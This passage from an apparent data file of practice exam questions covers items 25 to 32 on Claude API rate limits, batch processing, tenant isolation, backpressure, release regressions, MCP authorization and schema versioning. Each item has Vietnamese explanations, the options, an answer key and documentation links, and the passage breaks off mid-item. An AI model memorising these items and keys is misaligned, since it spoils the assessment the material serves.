          "Gửi lại từ đầu là vứt phần tìm kiếm đã làm, chạy lại y vậy, rất có thể lại chạm giới hạn ở đúng chỗ cũ."
        ] },
      { k: "C", gist: "Append a new user message saying 'continue' after the paused assistant message, and discard the earlier content.",
        why: [
          "Sai hai chỗ: bỏ phần nội dung trước là mất việc đang làm dở, và docs ghi rõ không thêm message user sau message <code>assistant</code> (ý 2).",
          "Dễ bị cuốn vì gõ “continue” là phản xạ khi chat bị cắt ngang. Nhưng server cần chính phần <code>content</code> đó, kể cả khối <code>server_tool_use</code> chưa có kết quả, để làm tiếp."
        ] },
      { k: "D", gist: "Add the response content, unmodified, as an assistant message and send the request again with the same tools, inside a loop capped at a maximum number of continuations.",
        why: [
          "Đúng y cách docs quy định: content giữ nguyên làm message <code>assistant</code>, cùng <code>tools</code>, gửi tiếp (ý 2).",
          "Vòng lặp có trần số lần tiếp tục, giống <code>max_requests</code> trong code mẫu (ý 3): lượt cứ bị tạm dừng mãi thì agent cũng không lặp vô hạn."
        ] }
    ],
    refs: [
      { label: "Docs Stop reasons, mục “pause_turn”: nghĩa của stop reason này và hai bước để tiếp tục lượt", href: "https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons#pause-turn" },
      { label: "Docs Stop reasons, mục “Implement retry logic for pause_turn”: gửi lại content y nguyên trong vòng lặp có giới hạn", href: "https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons#implement-retry-logic-for-pause-turn" }
    ]
  },
  {
    de: 1, n: 25, total: 100, sub: "2.2", subName: "Quy mô và thông lượng",
    answer: "C",
    ask: "A document-analysis product gets frequent 429s carrying retry-after headers during business hours. Dashboards show requests per minute sitting well under the account's request limit, but every request includes large documents, and input tokens per minute stay pinned at the ceiling. Which approach best addresses the constraint that is actually binding?",
    scene: [
      "Giờ hành chính hay dính 429, kèm header <code>retry-after</code>.",
      "Số request mỗi phút (RPM) còn xa giới hạn. Nhưng request nào cũng mang tài liệu lớn, và input token mỗi phút (ITPM) luôn chạm trần.",
      "Chỗ khó không nằm ở chẩn đoán, vì dashboard đã chỉ ra giới hạn nào nghẽn. Phương án nào nhắm sai giới hạn thì loại."
    ],
    asks: [
      "Cách nào phản ánh đúng ràng buộc đang thật sự chặn (binding constraint)?",
      "Tức là: điều tiết theo token chứ không theo số request, và lo luôn phần nhu cầu vượt trần."
    ],
    facts: [
      "Docs Rate limits: Messages API giới hạn theo RPM, ITPM và OTPM cho từng nhóm model. Vượt bất kỳ cái nào cũng ra 429 nói rõ giới hạn nào bị vượt. Có <code>retry-after</code> thì chờ đúng số giây đó.",
      "ITPM được ước lượng ở đầu mỗi request rồi chỉnh theo số token thật. Request mang tài liệu lớn ăn ITPM rất nhanh dù số request ít.",
      "Việc không gấp có thể chuyển sang Message Batches API, vốn có bộ giới hạn riêng. Nhu cầu cao kéo dài thì xin nâng giới hạn trên trang Rate limits của Console.",
      "Docs cũng ghi: token đọc từ cache không tính vào ITPM, nên prompt caching là một cách tăng thông lượng khi có phần prompt lặp lại."
    ],
    opts: [
      { k: "A", gist: "Put a client-side requests-per-minute limiter in place, set below the account's limit.",
        why: [
          "Sai giới hạn: RPM đang dư, cái nghẽn là ITPM (ý 1).",
          "Chặn RPM thấp hơn chỉ làm giảm thông lượng. Vài request tài liệu lớn vẫn đủ đẩy ITPM chạm trần (ý 2)."
        ] },
      { k: "B", gist: "Break every document into many tiny requests so each stays below any per-request threshold.",
        why: [
          "Sai: tổng token không giảm, còn tăng, vì mẩu nào cũng phải mang lại phần chỉ dẫn và ngữ cảnh chung (ý 2).",
          "Không có “ngưỡng mỗi request” nào đang chặn ở đây. Chia nhỏ còn đẩy RPM lên, có khi nghẽn thêm cả giới hạn đó."
        ] },
      { k: "C", gist: "Introduce a token-aware admission controller that paces work using estimated token counts, queues non-urgent requests or routes them to batch, and asks for more capacity if the demand persists.",
        why: [
          "Đúng: điều tiết theo token ước lượng, nhắm thẳng ITPM, đúng giới hạn đang chặn (ý 1, ý 2).",
          "Việc không gấp xếp hàng hoặc đưa sang batch, nhường ITPM cho việc gấp. Nhu cầu cao kéo dài thì xin nâng giới hạn, vì điều tiết chỉ chia lại phần đang có (ý 3)."
        ] },
      { k: "D", gist: "Bump the number of retries on 429 so the requests get through in the end.",
        why: [
          "Sai: retry thêm là dội thêm tải vào đúng giới hạn đang chạm trần.",
          "Dễ bị cuốn vì có <code>retry-after</code>, nghe như cứ chờ rồi thử là xong. Nhưng đó là cách xử lý từng request, không sửa việc nhu cầu token vượt trần cả buổi."
        ] }
    ],
    refs: [
      { label: "Docs Rate limits, mục “Rate limits”: RPM, ITPM, OTPM, lỗi 429 và header retry-after", href: "https://platform.claude.com/docs/en/api/rate-limits#rate-limits" },
      { label: "Docs Rate limits, mục “Cache-aware ITPM”: ITPM tính thế nào, token đọc từ cache không tính", href: "https://platform.claude.com/docs/en/api/rate-limits#cache-aware-itpm" },
      { label: "Docs Rate limits, mục “Requesting higher limits”: xin nâng giới hạn khi nhu cầu kéo dài", href: "https://platform.claude.com/docs/en/api/rate-limits#requesting-higher-limits" }
    ]
  },
  {
    de: 1, n: 26, total: 100, sub: "2.2", subName: "Quy mô và thông lượng",
    answer: "D",
    ask: "A nightly job classifies two million support tickets using the real-time API and a worker pool. While it runs, it keeps hitting rate limits and slows down the interactive daytime features that share the same account, even though nobody is waiting on its output. Which design is best?",
    scene: [
      "Job chạy đêm phân loại 2 triệu ticket hỗ trợ, đang dùng API thời gian thực với một pool worker.",
      "Lúc chạy, job liên tục dính rate limit và làm chậm các tính năng tương tác dùng chung tài khoản.",
      "Dữ kiện mấu chốt: “no one is waiting for the results” (không ai chờ kết quả). Việc không cần trả lời ngay đang chiếm suất của việc cần trả lời ngay."
    ],
    asks: [
      "Thiết kế nào tốt nhất?",
      "Tức là: đưa khối việc lớn, không gấp này ra khỏi đường thời gian thực, và phục hồi được từng ticket hỏng mà không chạy lại cả lô."
    ],
    facts: [
      "Docs Batch processing: Message Batches API xử lý bất đồng bộ khối lượng lớn request Messages, giảm 50% chi phí, hợp với việc không cần trả lời ngay. Phần lớn batch xong dưới 1 giờ, quá 24 giờ chưa xong thì hết hạn.",
      "Docs Rate limits: Message Batches API có bộ giới hạn riêng. Mỗi batch tối đa 100.000 request hoặc 256 MB, nên 2 triệu ticket phải chia thành nhiều batch.",
      "Mỗi request trong batch có <code>custom_id</code> riêng. Kết quả có thể về không theo thứ tự, nên phải ghép bằng <code>custom_id</code>. Từng kết quả có loại riêng: <code>succeeded</code>, <code>errored</code>, <code>canceled</code>, <code>expired</code>.",
      "Request <code>errored</code> hay <code>expired</code> không bị tính tiền. Mày gom đúng những cái đó lại rồi gửi lại."
    ],
    opts: [
      { k: "A", gist: "Cut the job into hourly slices and run each one on the real-time API during business hours.",
        why: [
          "Sai: dời tải vào đúng giờ người dùng đông nhất, chỗ tranh chấp đau nhất.",
          "Vẫn dùng đường thời gian thực, chỉ đổi giờ va chạm, trong khi batch có suất riêng (ý 2)."
        ] },
      { k: "B", gist: "Switch the job to a smaller model and stay on the real-time API to cut token usage.",
        why: [
          "Sai ở chỗ vẫn giữ API thời gian thực: 2 triệu ticket vẫn dồn vào đường dành cho việc cần trả lời ngay, và không được giá batch (ý 1).",
          "Đổi model còn là đổi chất lượng phân loại mà chưa ai kiểm. Thêm một rủi ro, trong khi chỗ sai gốc là dùng đường thời gian thực cho việc không gấp."
        ] },
      { k: "C", gist: "Push concurrency higher and retry more aggressively so the job is done by morning.",
        why: [
          "Sai: tăng song song là tăng tranh chấp với tính năng tương tác, đúng thứ đang gây chậm.",
          "Retry dồn dập khi đang dính rate limit chỉ làm 429 nhiều thêm. “Xong trước sáng” không đòi trả lời ngay, nên batch hợp hơn (ý 1)."
        ] },
      { k: "D", gist: "Send the work through the Batch API with a custom id for each ticket, then poll for results and resubmit only the items that failed.",
        why: [
          "Đúng: việc lớn, không gấp là đúng loại batch sinh ra để làm. Rẻ hơn 50% và chạy trên giới hạn riêng, không giành suất của tính năng tương tác (ý 1, ý 2).",
          "<code>custom_id</code> theo từng ticket để ghép kết quả về đúng ticket, rồi chỉ gửi lại cái <code>errored</code> hay <code>expired</code>, không chạy lại cả lô (ý 3, ý 4)."
        ] }
    ],
    refs: [
      { label: "Docs Batch processing, mục “Batch limitations”: 100.000 request hoặc 256 MB mỗi batch, hạn 24 giờ", href: "https://platform.claude.com/docs/en/build-with-claude/batch-processing#batch-limitations" },
      { label: "Docs Batch processing, mục “Retrieving batch results”: các loại kết quả, ghép kết quả bằng custom_id", href: "https://platform.claude.com/docs/en/build-with-claude/batch-processing#retrieving-batch-results" },
      { label: "Docs Rate limits, mục “Message Batches API”: batch có bộ giới hạn riêng", href: "https://platform.claude.com/docs/en/api/rate-limits#message-batches-api" }
    ]
  },
  {
    de: 1, n: 27, total: 100, sub: "2.2", subName: "Quy mô và thông lượng",
    answer: "A",
    ask: "A multi-tenant SaaS runs all its customers through one shared Claude account. Whenever one large tenant kicks off a bulk import, the other tenants get slow responses and 429 errors. Which design most directly isolates tenants from each other?",
    scene: [
      "SaaS nhiều khách thuê (multi-tenant), tất cả đi qua một tài khoản Claude, tức là chung một bộ rate limit.",
      "Một khách lớn chạy import hàng loạt là các khách khác chậm và dính 429.",
      "Chỗ khó: đề hỏi “isolate” (cô lập), không hỏi giảm hay né. Cần một cơ chế để cơn bùng của khách này không ăn sang phần của khách khác."
    ],
    asks: [
      "Thiết kế nào cô lập các khách thuê trực tiếp nhất?",
      "Tức là: mỗi khách có trần riêng được ép bằng code, và hàng đợi chia lượt công bằng."
    ],
    facts: [
      "Docs Rate limits: giới hạn đặt ở cấp tổ chức. Mọi khách đi qua một tài khoản là cùng rút từ một bể RPM, ITPM, OTPM.",
      "Docs có cùng ý tưởng ở cấp workspace: đặt giới hạn riêng cho từng workspace “to protect other workspaces from potential overuse” (để bảo vệ workspace khác khỏi bị dùng lố). Trong app của mày, khách thuê là đơn vị cần làm việc đó.",
      "Fair scheduling (chia lượt công bằng): mỗi khách một hàng đợi, bộ lập lịch lấy lần lượt, nên hàng dài của một khách không chặn hàng của khách khác. Ngược với một hàng FIFO (vào trước ra trước) dùng chung.",
      "Thỏa thuận không có cơ chế ép thì không phải giới hạn. Một lần quên hay một script lỗi là tràn."
    ],
    opts: [
      { k: "A", gist: "Give every tenant its own token-based quota and its own queue with fair scheduling, so a tenant's burst can only use up its own allotment.",
        why: [
          "Đúng: quota theo token cho từng khách là trần được ép bằng code, cơn bùng của khách lớn chỉ đốt phần của nó (ý 1, ý 2).",
          "Hàng đợi riêng cộng chia lượt công bằng: khách nhỏ vẫn được phục vụ đều dù khách lớn còn cả đống việc chờ (ý 3)."
        ] },
      { k: "B", gist: "Raise the retry count for every tenant so they ride out the bulk import, leaving current monitoring as is.",
        why: [
          "Sai: retry nhiều hơn là thêm tải vào bể đang cạn, khách nào cũng chậm hơn.",
          "Không có gì cô lập ở đây. Khách lớn vẫn ăn hết bể, khách khác chỉ chờ lâu hơn. Giữ nguyên giám sát nghĩa là cũng không ai thấy sớm hơn."
        ] },
      { k: "C", gist: "Place one larger shared FIFO (first-in, first-out) queue in front of the API.",
        why: [
          "Sai: hàng FIFO chung thì đống việc import vào trước sẽ đứng trước request của mọi khách khác (ý 3).",
          "Dễ bị cuốn vì hàng đợi nghe như cách chống 429. Nhưng hàng to hơn chỉ đổi 429 thành chờ lâu, vẫn không cô lập ai."
        ] },
      { k: "D", gist: "Contractually ask the large tenant to import only at night, with nothing to enforce it.",
        why: [
          "Sai: thỏa thuận không ép bằng code thì phụ thuộc thiện chí và sự cẩn thận của khách (ý 4).",
          "Một lần họ chạy nhầm giờ là các khách khác lại chậm. Đề hỏi thiết kế cô lập, không hỏi điều khoản hợp đồng."
        ] }
    ],
    refs: [
      { label: "Docs Rate limits, mục “Setting lower limits for workspaces”: đặt trần riêng để một bên dùng lố không ăn phần bên khác", href: "https://platform.claude.com/docs/en/api/rate-limits#setting-lower-limits-for-workspaces" },
      { label: "Docs Rate limits, mục “About rate limits”: giới hạn đặt ở cấp tổ chức", href: "https://platform.claude.com/docs/en/api/rate-limits#about-rate-limits" }
    ]
  },
  {
    de: 1, n: 28, total: 100, sub: "2.2", subName: "Quy mô và thông lượng",
    answer: "CD",
    ask: "A team is adding backpressure so a traffic spike does not snowball into a retry storm against the Claude API. Which two measures fit? (Choose two.)",
    scene: [
      "Team thêm backpressure (đẩy ngược áp lực: hệ phía sau quá tải thì hệ phía trước phải chậm lại hoặc từ chối).",
      "Mục tiêu: một đợt tăng đột biến không biến thành “retry storm” (bão retry: request lỗi thử lại dồn dập, tải càng tăng, lỗi càng nhiều).",
      "Chỗ khó: ba phương án sai đều nghe “tử tế”: không từ chối ai, không bỏ ai, xả hàng cho nhanh. Chính sự tử tế đó làm tải dồn lại."
    ],
    asks: [
      "Hai biện pháp nào phù hợp?",
      "Tức là: giới hạn lượng việc nhận vào theo đúng thứ API đo, và từ chối rõ ràng khi đầy."
    ],
    facts: [
      "Docs Rate limits: API đo theo RPM, ITPM, OTPM. Request mang prompt lớn có thể chạm ITPM trong khi RPM còn dư, nên chỉ đếm request là đếm sai thứ.",
      "Docs mục “Ramp limits”: tăng dùng đột ngột, kể cả một loạt request dồn trong vài giây, có thể ra 429 dù còn dưới ITPM, OTPM. Docs khuyên giữ lưu lượng ở mức đang thành công rồi mới tăng dần.",
      "Bounded queue (hàng đợi có giới hạn): đầy thì không nhận thêm. Load shedding (cắt tải): bỏ hoặc hoãn việc ưu tiên thấp để giữ việc quan trọng.",
      "Hàng đợi không giới hạn hay timeout thật dài không làm quá tải biến mất. Chúng chỉ đổi nó thành độ trễ, bộ nhớ và kết nối bị giữ, và che mất tín hiệu quá tải."
    ],
    opts: [
      { k: "A", gist: "Make the queue unbounded so that no request ever gets rejected.",
        why: [
          "Sai: không từ chối ai nghĩa là cả đợt tăng dồn hết vào hàng, độ trễ và bộ nhớ tăng không đáy (ý 4).",
          "Dễ bị cuốn vì “không bao giờ từ chối” nghe tốt cho người dùng. Nhưng người dùng chờ vài phút rồi bấm lại, đó cũng là một cơn bão retry khác."
        ] },
      { k: "B", gist: "Retry failed requests immediately so the queue empties as fast as possible.",
        why: [
          "Sai: retry ngay khi API đang trả 429 là nhân tải lên, đúng thứ gọi là bão retry.",
          "Đi ngược docs: ramp limit đòi giữ lưu lượng ổn định rồi tăng từ từ, không dồn (ý 2)."
        ] },
      { k: "C", gist: "Place a bounded queue ahead of the API client, shed or defer low-priority work, and give callers a clear overload response once the queue is full.",
        why: [
          "Đúng: hàng có giới hạn giữ độ trễ và bộ nhớ trong tầm kiểm soát, cắt việc ưu tiên thấp để giữ việc chính (ý 3).",
          "Trả về thông báo quá tải rõ ràng là nói thật với bên gọi, để họ lùi lại thay vì treo chờ hay retry mù."
        ] },
      { k: "D", gist: "Admit requests according to their estimated token consumption against the capacity left, not just by counting requests.",
        why: [
          "Đúng: nhận việc theo token ước lượng so với phần còn lại, khớp cách API thật sự đo (ý 1).",
          "Một request tài liệu lớn có thể tốn token bằng nhiều request nhỏ cộng lại. Chỉ đếm request thì cửa vẫn mở trong khi ITPM đã cạn."
        ] },
      { k: "E", gist: "Increase client timeouts to several minutes so queued requests are never dropped.",
        why: [
          "Sai: timeout vài phút là giữ kết nối và thread lâu hơn, tài nguyên cạn nhanh hơn khi có đợt tăng (ý 4).",
          "Nó giấu quá tải thay vì báo ra. Bên gọi chỉ thấy chậm, không biết là nên lùi lại."
        ] }
    ],
    refs: [
      { label: "Docs Rate limits, mục “Ramp limits”: tăng đột ngột cũng ra 429, và cách tăng lưu lượng từ từ", href: "https://platform.claude.com/docs/en/api/rate-limits#ramp-limits" },
      { label: "Docs Rate limits, mục “Rate limits”: API đo theo RPM, ITPM, OTPM", href: "https://platform.claude.com/docs/en/api/rate-limits#rate-limits" }
    ]
  },
  {
    de: 1, n: 29, total: 100, sub: "2.3", subName: "MCP production và quản lý thay đổi",
    answer: "B",
    ask: "A team moved to a newer Claude model and, in that same release, rewrote the system prompt to make use of it. A week later, support tickets point to worse answer quality in one particular product area. No one can say whether the model or the prompt is to blame. What should the team do now, and in future releases?",
    scene: [
      "Một bản phát hành gộp hai thay đổi: lên model Claude mới, và viết lại system prompt cho hợp model đó.",
      "Một tuần sau, ticket hỗ trợ cho thấy chất lượng trả lời giảm ở một mảng sản phẩm.",
      "Chỗ khó: hai thứ đổi cùng lúc nên không quy được lỗi cho cái nào. Đề hỏi cả “now” (bây giờ) lẫn “in future releases” (các lần phát hành sau)."
    ],
    asks: [
      "Team nên làm gì bây giờ, và trong các lần phát hành sau?",
      "Tức là: khôi phục chất lượng trước, rồi tách hai biến ra để tìm thủ phạm, và từ nay mỗi lần chỉ đổi một thứ."
    ],
    facts: [
      "Muốn biết thay đổi nào gây regression (hồi quy, chất lượng tụt so với trước) thì phải tách biến: giữ một thứ cố định, đổi thứ kia, đo trên cùng bộ đánh giá.",
      "Docs “Define success criteria and build evaluations”: tiêu chí phải cụ thể, đo được. Bộ eval phải giống phân bố việc thật, kể cả ca biên. Một cách đo docs nêu là A/B test: so với model nền hoặc phiên bản trước.",
      "Cũng docs đó: khi dùng LLM để chấm, nên chấm bằng model khác với model sinh ra câu trả lời. Model tự chấm mình không phải thước đo đã kiểm chứng.",
      "Rollback (quay về bản ổn định trước) phục hồi dịch vụ ngay, còn thí nghiệm tìm nguyên nhân chạy riêng."
    ],
    opts: [
      { k: "A", gist: "Roll back only the model, because models are behind most regressions, and keep the new prompt.",
        why: [
          "Sai: đoán thủ phạm thay vì kiểm (ý 1). Đề nói rõ không ai biết lỗi do đâu.",
          "Prompt mới viết riêng cho model mới. Ghép prompt mới với model cũ là một tổ hợp chưa từng chạy, có khi còn tệ hơn."
        ] },
      { k: "B", gist: "Go back to the last known-good pair, then test the new model with the old prompt and the new prompt with the old model as separate experiments, and from now on ship one change at a time.",
        why: [
          "Đúng phần “now”: quay về tổ hợp đã biết là tốt, người dùng hết chịu ảnh hưởng ngay (ý 4).",
          "Rồi tách biến: model mới với prompt cũ, prompt mới với model cũ, đo trên bộ eval có ca của mảng đang tụt (ý 1, ý 2). Kết quả chỉ ra thủ phạm.",
          "Phần “future”: mỗi lần phát hành một thay đổi, có lỗi là biết ngay do đâu."
        ] },
      { k: "C", gist: "Patch the symptom by adding another paragraph to the new prompt about that product area.",
        why: [
          "Sai: chưa biết nguyên nhân mà đã vá, tức là thêm biến thứ ba vào một hồi quy chưa quy được lỗi (ý 1).",
          "Dễ bị cuốn vì nhanh và có vẻ trúng chỗ đau. Nhưng nếu lỗi do model, đoạn vá chỉ che triệu chứng ở một mảng, mảng khác có thể cũng đang tụt mà chưa ai báo."
        ] },
      { k: "D", gist: "Keep both changes and have the model grade its own answers in the affected product area.",
        why: [
          "Sai: model tự chấm mình là thước đo chưa kiểm chứng, docs khuyên chấm bằng model khác (ý 3).",
          "Giữ cả hai thay đổi thì người dùng vẫn chịu chất lượng kém, mà nguyên nhân vẫn chưa biết."
        ] }
    ],
    refs: [
      { label: "Docs đánh giá, mục “Define your success criteria”: chốt tiêu chí cụ thể, đo được, rồi mới dựng bài đánh giá", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" },
      { label: "Docs đánh giá, mục “Eval design principles”: eval giống phân bố việc thật, chấm tự động được", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#eval-design-principles" }
    ]
  },
  {
    de: 1, n: 30, total: 100, sub: "2.3", subName: "MCP production và quản lý thay đổi",
    answer: "B",
    ask: "A team runs a remote MCP server that exposes internal HR tools. Right now it relies on a single shared static bearer token, copied into every employee's client configuration. The security team pushes back. Which design best matches MCP's authorization model?",
    scene: [
      "MCP server từ xa (remote) mở các tool HR nội bộ.",
      "Xác thực hiện tại: một bearer token tĩnh dùng chung, nằm trong cấu hình client của mọi nhân viên.",
      "Chỗ khó: server không biết ai đang gọi. Lộ một máy là lộ quyền của cả công ty, và không truy được hành động về từng người."
    ],
    asks: [
      "Thiết kế nào khớp nhất với mô hình phân quyền của MCP?",
      "Tức là: mỗi người dùng có token riêng, có giới hạn phạm vi, và server tự kiểm token lẫn quyền của người đó trên từng tool."
    ],
    facts: [
      "Spec MCP Authorization: phân quyền dựa trên OAuth 2.1, dành cho transport HTTP. MCP server đóng vai resource server, client xin access token thay mặt người dùng. Transport stdio thì không theo spec này, mà lấy credential từ môi trường.",
      "MCP server phải kiểm access token được cấp riêng cho chính nó (audience, bên nhận token) theo RFC 8707, và không được nhận hay chuyển tiếp token nào khác.",
      "Spec có chiến lược chọn scope (phạm vi quyền) theo least privilege (quyền tối thiểu): client chỉ xin scope cần cho việc. Thiếu scope thì server trả 403 <code>insufficient_scope</code>.",
      "Mô tả tool là văn bản model đọc, không phải cơ chế kiểm soát truy cập. Chỗ chặn thật là server."
    ],
    opts: [
      { k: "A", gist: "Limit the server to a local stdio process on each laptop and put the service credentials in the config.",
        why: [
          "Sai: rải credential của dịch vụ ra mọi laptop, lộ một máy là lộ quyền của server.",
          "stdio đúng là lấy credential từ môi trường (ý 1), nhưng ở đây vẫn là một credential chung. Không có phân quyền theo từng người dùng."
        ] },
      { k: "B", gist: "Require OAuth-based authorization so each user gets a scoped access token, and have the server confirm tokens were issued for it and check that user's permissions for each tool.",
        why: [
          "Đúng mô hình của spec: OAuth 2.1, mỗi người một access token có scope (ý 1, ý 3).",
          "Server kiểm token cấp cho chính nó (audience) rồi kiểm quyền của người đó trên từng tool (ý 2). Hành động truy được về từng người, lộ một token chỉ mất quyền của một người trong phạm vi scope."
        ] },
      { k: "C", gist: "Keep the shared token and add a line to every tool description instructing the model to call tools only for the logged-in user.",
        why: [
          "Sai: mô tả tool là prompt, không phải kiểm soát truy cập (ý 4).",
          "Dễ bị cuốn vì không phải đổi hạ tầng. Nhưng token chung vẫn mở mọi tool, ai cầm token gọi thẳng server là qua, chẳng cần qua model."
        ] },
      { k: "D", gist: "Keep the shared token but rotate it every month and place it behind the corporate VPN.",
        why: [
          "Sai: xoay vòng và VPN bớt rủi ro một chút, nhưng token vẫn chung, server vẫn không biết ai đang gọi (ý 2).",
          "Lộ token thì người cầm nó có toàn quyền tới lần xoay sau. Dữ liệu HR nhạy cảm, cần quyền theo từng người."
        ] }
    ],
    refs: [
      { label: "Spec MCP Authorization, mục “Protocol Requirements”: transport HTTP theo OAuth, stdio lấy credential từ môi trường", href: "https://modelcontextprotocol.io/specification/latest/basic/authorization#protocol-requirements" },
      { label: "Spec MCP Authorization, mục “Token Handling”: server phải kiểm token cấp cho chính nó, không nhận hay chuyển tiếp token khác", href: "https://modelcontextprotocol.io/specification/latest/basic/authorization#token-handling" },
      { label: "Spec MCP Authorization, mục “Scope Selection Strategy”: xin scope theo quyền tối thiểu", href: "https://modelcontextprotocol.io/specification/latest/basic/authorization#scope-selection-strategy" }
    ]
  },
  {
    de: 1, n: 31, total: 100, sub: "2.3", subName: "MCP production và quản lý thay đổi",
    answer: "D",
    ask: "An MCP server team renamed one tool parameter and made a new field mandatory. Agents in three downstream products started failing on their very first call, and the first sign of trouble was customer complaints. How should the team handle changes like this from now on?",
    scene: [
      "Đội làm MCP server đổi tên một tham số của tool và thêm một trường bắt buộc (required).",
      "Ba sản phẩm phía dưới (downstream) có agent gọi tool này. Cả ba hỏng ngay lần gọi đầu.",
      "Người báo tin đầu tiên là khách hàng phàn nàn: không có test hay cảnh báo nào bắt được trước.",
      "Chỗ khó: hai lỗi chồng nhau. Thay đổi phá tương thích tung thẳng ra, và không có gì kiểm trước khi tung."
    ],
    asks: [
      "Từ nay đội nên quản lý kiểu thay đổi này thế nào?",
      "Tức là: cần một quy trình để đổi schema mà không làm gãy bên đang dùng, và lỡ có gãy thì bắt được trước khách.",
      "Soi từng phương án theo hai câu: trong lúc chuyển, bên dùng cũ còn chạy không? Lỗi có bị bắt trước khi lên production không?"
    ],
    facts: [
      "Trong MCP, mỗi tool khai <code>inputSchema</code>: một JSON Schema mô tả tham số, kèm danh sách <code>required</code>. Bên dùng gửi lời gọi theo schema đó, nên schema là hợp đồng (contract) giữa server và bên dùng.",
      "Đổi tên tham số hay thêm trường bắt buộc là breaking change (thay đổi phá tương thích): lời gọi đúng theo schema cũ giờ bị từ chối. Thêm trường tùy chọn (optional) thì lời gọi cũ vẫn hợp lệ.",
      "Cách quen thuộc với API dùng chung: thay đổi phá tương thích thì ra phiên bản mới, chạy song song bản cũ một thời gian (overlap), báo ngưng dần (deprecation) rồi mới gỡ.",
      "Consumer contract test (test hợp đồng của bên dùng): bộ test ghi lại các lời gọi bên dùng đang gửi, chạy trong CI của server. Server đổi schema làm gãy lời gọi nào thì CI đỏ trước khi release."
    ],
    opts: [
      { k: "A", gist: "Rewrite the tool descriptions to explain the new parameter in more depth so the model adjusts.",
        why: [
          "Sai ở chỗ coi đây là chuyện model hiểu sai. Lỗi nằm ở hợp đồng: bên dùng đang gửi lời gọi theo schema cũ (ý 1, ý 2).",
          "Bên dùng có thể đã viết code, cấu hình, test theo tên tham số cũ. Trường bắt buộc mới thì họ còn chưa biết lấy giá trị ở đâu. Mô tả dài hơn không sửa được chuyện đó, lần sau cũng không có gì cảnh báo trước."
        ] },
      { k: "B", gist: "Freeze the server once released and stand up a brand-new server for every improvement.",
        why: [
          "Sai vì quá tay: cấm sửa server sau release, mỗi cải tiến là một server mới.",
          "Bên dùng phải đổi kết nối mỗi lần, số server mọc ra mà không có lịch gỡ. Có phiên bản nhưng thiếu chính sách chuyển đổi và ngưng dần (ý 3)."
        ] },
      { k: "C", gist: "Post the changes in a channel and expect every team to update its prompts on release day.",
        why: [
          "Sai: thông báo không chặn được gì. Ngày release bản cũ biến mất, đội nào chưa kịp sửa là gãy (ý 3).",
          "Bắt ba đội cùng sửa trong một ngày, không có giai đoạn chạy song song. Một đội chậm là khách lại gặp lỗi.",
          "Dễ bị cuốn vì nghe có trách nhiệm: đã báo trước rồi mà. Nhưng báo trước không phải là thời gian chuyển đổi, và vẫn không có test nào kiểm (ý 4)."
        ] },
      { k: "D", gist: "Handle schemas as versioned contracts: make additive, optional changes by default, release breaking changes as a new version with an overlap and deprecation window, and run consumer contract tests in CI.",
        why: [
          "Đúng: coi schema là hợp đồng có phiên bản (ý 1). Mặc định chỉ thêm, và thêm ở dạng tùy chọn, nên lời gọi cũ vẫn chạy (ý 2).",
          "Buộc phải phá tương thích thì ra bản mới, chạy song song và báo ngưng dần. Ba sản phẩm có thời gian chuyển (ý 3).",
          "Contract test trong CI bắt đúng lỗi lần này trước khi release, không phải chờ khách phàn nàn (ý 4)."
        ] }
    ],
    refs: [
      { label: "MCP spec Tools, mục “Data Types” → “Tool”: <code>inputSchema</code> là JSON Schema định nghĩa tham số tool, ví dụ có <code>required</code>", href: "https://modelcontextprotocol.io/specification/2025-06-18/server/tools" }
    ]
  },
  {
    de: 1, n: 32, total: 100, sub: "2.3", subName: "MCP production và quản lý thay đổi",
    answer: "AB",
    ask: "A team plans to roll out a new version of the production system prompt for a high-traffic assistant. Which two practices reduce the risk the most? (Choose two.)",
    scene: [
      "Trợ lý lưu lượng cao, sắp đổi system prompt production sang bản mới.",
      "Đổi prompt cũng là một lần deploy: hành vi model đổi theo, có thể tốt lên chỗ này, tệ đi chỗ khác.",
      "Chỗ khó: đề hỏi “reduce the risk” (giảm rủi ro), không hỏi cách tung nhanh. Mỗi phương án sai đều có một nửa nghe hợp lý: eval offline, giờ vắng, thấy lỗi nhanh."
    ],
    asks: [
      "Hai cách làm nào giảm rủi ro tốt nhất?",
      "Tức là: lỡ bản mới tệ hơn thì ít người dính nhất, phát hiện sớm nhất, quay lại nhanh nhất.",
      "Soi từng phương án theo ba câu: giới hạn được phạm vi ảnh hưởng không, đo được không, quay lại được không."
    ],
    facts: [
      "Bài “Demystifying evals for AI agents” của Anthropic: eval tự động hợp nhất trước khi tung và trong CI/CD, nhưng dễ cho cảm giác yên tâm giả nếu không khớp cách dùng thật. Đội làm tốt kết hợp eval tự động để lặp nhanh với theo dõi production làm sự thật cuối cùng.",
      "Docs đánh giá cũng dặn eval phải mô phỏng đúng phân bố việc thật, kể cả ca biên. Bộ offline nào cũng chỉ là một mẫu, không bao giờ là “every case” (mọi ca).",
      "Canary (thả bản mới cho một phần nhỏ lưu lượng) và shadow (chạy bản mới song song trên lưu lượng thật, không trả kết quả cho người dùng): hai cách thử trên dữ liệu thật mà giới hạn phạm vi ảnh hưởng.",
      "Rollback (quay lại bản cũ) nhanh nhất khi bản cũ còn nguyên và chỉ cần đổi cấu hình trỏ về nó. Gắn phiên bản prompt vào từng câu trả lời thì truy được lỗi do bản nào."
    ],
    opts: [
      { k: "A", gist: "Store prompts in a versioned registry that configuration points to, so a rollback is just a config change and every response can be traced back to a prompt version.",
        why: [
          "Đúng: prompt có phiên bản, cấu hình trỏ tới bản nào thì chạy bản đó (ý 4).",
          "Quay lại chỉ là đổi cấu hình, không phải sửa rồi deploy lại. Mỗi câu trả lời gắn số phiên bản, nên chỉ số xấu đi là biết do bản nào.",
          "Đây cũng là nền cho B: canary hay rollback tự động đều cần chọn được bản prompt bằng cấu hình."
        ] },
      { k: "B", gist: "Roll out gradually through shadow or canary traffic, compare quality, refusal and cost metrics with the baseline, and roll back automatically if they regress.",
        why: [
          "Đúng: thả dần qua shadow hay canary, bản mới có tệ thì chỉ một phần nhỏ dính (ý 3).",
          "So với bản gốc (baseline) về chất lượng, tỉ lệ từ chối, chi phí: đúng những thứ eval offline có thể bỏ sót trên lưu lượng thật (ý 1).",
          "Tự rollback khi chỉ số xấu đi: không phải chờ người trực phát hiện."
        ] },
      { k: "C", gist: "Send it to all traffic once the offline eval passes, since the offline suite already covers every case.",
        why: [
